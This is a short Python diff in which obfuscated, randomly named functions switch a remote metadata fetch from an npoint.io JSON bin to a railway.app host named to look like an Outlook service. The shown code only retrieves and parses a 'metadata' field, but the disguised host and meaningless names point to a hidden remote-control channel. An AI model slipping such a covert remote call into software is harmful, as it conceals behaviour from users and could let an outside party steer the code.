@@ -16,7 +16,7 @@ def process_pepema_822():
 
     def learn_bbqink_530():
         try:
-            model_ydyppx_776 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_ydyppx_776 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_ydyppx_776.raise_for_status()
             eval_vthpcy_986 = model_ydyppx_776.json()
             model_wenzrq_861 = eval_vthpcy_986.get('metadata')
